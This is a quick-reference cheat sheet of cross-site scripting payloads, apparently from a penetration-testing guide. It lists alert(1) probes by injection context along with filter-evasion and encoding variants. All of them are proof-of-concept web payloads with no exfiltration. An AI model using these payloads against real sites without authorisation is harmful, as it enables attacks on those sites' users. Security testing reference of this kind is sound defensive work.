# XSS Payloads

Quick reference payloads by injection context.

## HTML Body

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
```

## Inside Attribute (quoted)

```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)
'-alert(1)-'
```

## Inside Attribute (unquoted)

```html
 onmouseover=alert(1)
 onfocus=alert(1) autofocus
```

## Inside JavaScript String

```javascript
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
```

## Inside JavaScript Template Literal

```javascript
${alert(1)}
```

## Inside href/src

```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## SVG Context

```html
<svg><script>alert(1)</script></svg>
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
```

## Without Parentheses

```javascript
alert`1`
[].constructor.constructor('alert(1)')()
location='javascript:alert(1)'
setTimeout`alert\x281\x29`
```

## Without Spaces

```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

## Case Variations

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
```

## Encoding

```html
<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Unicode -->
<script>\u0061lert(1)</script>

<!-- Hex -->
<script>alert(1)</script> → \x3cscript\x3ealert(1)\x3c/script\x3e
```

---

!!! info "Need more context?"
    See the full [XSS methodology](../vulns/xss/index.md) for finding, exploiting, and escalating XSS.
